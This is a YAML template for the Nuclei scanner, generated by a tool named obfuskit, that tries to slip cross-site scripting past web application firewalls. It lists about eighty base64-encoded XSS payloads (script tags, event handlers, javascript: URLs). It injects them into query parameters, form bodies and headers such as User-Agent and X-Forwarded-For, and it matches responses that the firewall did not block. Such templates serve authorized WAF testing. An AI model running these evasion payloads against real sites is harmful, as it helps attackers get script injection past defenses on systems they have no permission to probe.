# Generated by obfuskit on 2025-07-25 03:42:37
# WAF Bypass Nuclei Template

id: waf-bypass-xss-base64variants

info:
  name: "WAF Bypass - xss using Base64Variants"
  author:
    - obfuskit
  severity: high
  description: "WAF bypass for xss attacks using Base64Variants evasion techniques"
  tags:
    - waf
    - bypass
    - xss
    - base64variants

payloads:
  payload:
    - "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
    - "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4"
    - "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=="
    - "PGltZyBzcmM9IngiIG9uZXJyb3I9ImFsZXJ0KCdYU1MnKSI+"
    - "PGltZyBzcmM9IngiIG9uZXJyb3I9ImFsZXJ0KCdYU1MnKSI-"
    - "PGltZyBzcmM9IngiIG9uZXJyb3I9ImFsZXJ0KCdYU1MnKSI-="
    - "PGltZyBzcmM9IngiIG9uZXJyb3I9ImFsZXJ0KCdYU1MnKSI"
    - "PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpIj48L2lmcmFtZT4="
    - "PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpIj48L2lmcmFtZT4"
    - "PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpIj48L2lmcmFtZT4=="
    - "PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPkNsaWNrIG1lPC9hPg=="
    - "PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPkNsaWNrIG1lPC9hPg"
    - "PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPkNsaWNrIG1lPC9hPg==="
    - "PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPkNsaWNrIG1lPC9hPg="
    - "PGJvZHkgb25sb2FkPSJhbGVydCgnWFNTJykiPg=="
    - "PGJvZHkgb25sb2FkPSJhbGVydCgnWFNTJykiPg"
    - "PGJvZHkgb25sb2FkPSJhbGVydCgnWFNTJykiPg==="
    - "PGJvZHkgb25sb2FkPSJhbGVydCgnWFNTJykiPg="
    - "PGlucHV0IHR5cGU9InRleHQiIHZhbHVlPSI8c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0PiI+"
    - "PGlucHV0IHR5cGU9InRleHQiIHZhbHVlPSI8c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0PiI-"
    - "PGlucHV0IHR5cGU9InRleHQiIHZhbHVlPSI8c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0PiI-="
    - "PGlucHV0IHR5cGU9InRleHQiIHZhbHVlPSI8c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0PiI"
    - "PGRpdiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKGphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpKSI+"
    - "PGRpdiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKGphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpKSI-"
    - "PGRpdiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKGphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpKSI-="
    - "PGRpdiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKGphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpKSI"
    - "PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSI+"
    - "PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSI-"
    - "PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSI-="
    - "PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSI"
    - "PG9iamVjdCBkYXRhPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI+"
    - "PG9iamVjdCBkYXRhPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-"
    - "PG9iamVjdCBkYXRhPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-="
    - "PG9iamVjdCBkYXRhPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI"
    - "PGVtYmVkIHNyYz0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPg=="
    - "PGVtYmVkIHNyYz0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPg"
    - "PGVtYmVkIHNyYz0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPg==="
    - "PGVtYmVkIHNyYz0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPg="
    - "PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI+"
    - "PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-"
    - "PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-="
    - "PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI"
    - "PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9amF2YXNjcmlwdDphbGVydCgnWFNTJykiPg=="
    - "PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9amF2YXNjcmlwdDphbGVydCgnWFNTJykiPg"
    - "PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9amF2YXNjcmlwdDphbGVydCgnWFNTJykiPg==="
    - "PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9amF2YXNjcmlwdDphbGVydCgnWFNTJykiPg="
    - "PGZvcm0gYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI+"
    - "PGZvcm0gYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-"
    - "PGZvcm0gYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-="
    - "PGZvcm0gYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI"
    - "PGJ1dHRvbiBvbmNsaWNrPSJhbGVydCgnWFNTJykiPkNsaWNrIG1lPC9idXR0b24+"
    - "PGJ1dHRvbiBvbmNsaWNrPSJhbGVydCgnWFNTJykiPkNsaWNrIG1lPC9idXR0b24-"
    - "PGJ1dHRvbiBvbmNsaWNrPSJhbGVydCgnWFNTJykiPkNsaWNrIG1lPC9idXR0b24-="
    - "PGJ1dHRvbiBvbmNsaWNrPSJhbGVydCgnWFNTJykiPkNsaWNrIG1lPC9idXR0b24"
    - "PHRleHRhcmVhIG9uZm9jdXM9ImFsZXJ0KCdYU1MnKSI+PC90ZXh0YXJlYT4="
    - "PHRleHRhcmVhIG9uZm9jdXM9ImFsZXJ0KCdYU1MnKSI+PC90ZXh0YXJlYT4"
    - "PHRleHRhcmVhIG9uZm9jdXM9ImFsZXJ0KCdYU1MnKSI-PC90ZXh0YXJlYT4="
    - "PHRleHRhcmVhIG9uZm9jdXM9ImFsZXJ0KCdYU1MnKSI-PC90ZXh0YXJlYT4"
    - "PHRleHRhcmVhIG9uZm9jdXM9ImFsZXJ0KCdYU1MnKSI-PC90ZXh0YXJlYT4=="
    - "PG1hcnF1ZWUgb25zdGFydD0iYWxlcnQoJ1hTUycpIj5YU1M8L21hcnF1ZWU+"
    - "PG1hcnF1ZWUgb25zdGFydD0iYWxlcnQoJ1hTUycpIj5YU1M8L21hcnF1ZWU-"
    - "PG1hcnF1ZWUgb25zdGFydD0iYWxlcnQoJ1hTUycpIj5YU1M8L21hcnF1ZWU-="
    - "PG1hcnF1ZWUgb25zdGFydD0iYWxlcnQoJ1hTUycpIj5YU1M8L21hcnF1ZWU"
    - "PGJhc2UgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPg=="
    - "PGJhc2UgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPg"
    - "PGJhc2UgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPg==="
    - "PGJhc2UgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPg="
    - "PGJnc291bmQgc3JjPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI+"
    - "PGJnc291bmQgc3JjPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-"
    - "PGJnc291bmQgc3JjPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-="
    - "PGJnc291bmQgc3JjPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI"
    - "PGlzaW5kZXggYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI+"
    - "PGlzaW5kZXggYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-"
    - "PGlzaW5kZXggYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI-="
    - "PGlzaW5kZXggYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKSI"
    - "PHhzcyBzdHlsZT0ieHNzOmV4cHJlc3Npb24oYWxlcnQoJ1hTUycpKSI+"
    - "PHhzcyBzdHlsZT0ieHNzOmV4cHJlc3Npb24oYWxlcnQoJ1hTUycpKSI-"
    - "PHhzcyBzdHlsZT0ieHNzOmV4cHJlc3Npb24oYWxlcnQoJ1hTUycpKSI-="
    - "PHhzcyBzdHlsZT0ieHNzOmV4cHJlc3Npb24oYWxlcnQoJ1hTUycpKSI"

requests:
  - method: GET
    path:
      - "/?test={{payload}}"
      - "/?q={{payload}}"
      - "/?search={{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

  - method: POST
    path:
      - "/"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "param={{payload}}&test={{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

  - method: GET
    path:
      - "/"
    headers:
      X-Real-IP: "{{payload}}"
      X-Test-Header: "{{payload}}"
      User-Agent: "{{payload}}"
      X-Forwarded-For: "{{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

